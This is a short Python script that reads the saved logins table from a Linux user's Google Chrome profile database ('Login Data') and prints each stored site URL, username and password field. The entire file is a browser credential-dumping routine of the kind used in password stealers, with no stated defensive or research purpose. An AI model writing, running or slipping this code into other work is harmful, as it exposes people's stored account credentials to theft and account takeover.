import os.path
import sqlite3
import sys
from pathlib import Path
home = str(Path.home())

statement = "SELECT origin_url OriginUrl,  username_value UsernameValue, password_value PasswordValue FROM logins"
path = home+"/.config/google-chrome/Default"

#open database
db = sqlite3.connect(path+'/Login Data')
c = db.cursor()

#read database
c.execute(statement)
results =c.fetchall()

#print database
for i in results:
    print(i[0],"\t\t\t", i[1],"\t\t\t",i[2])
    
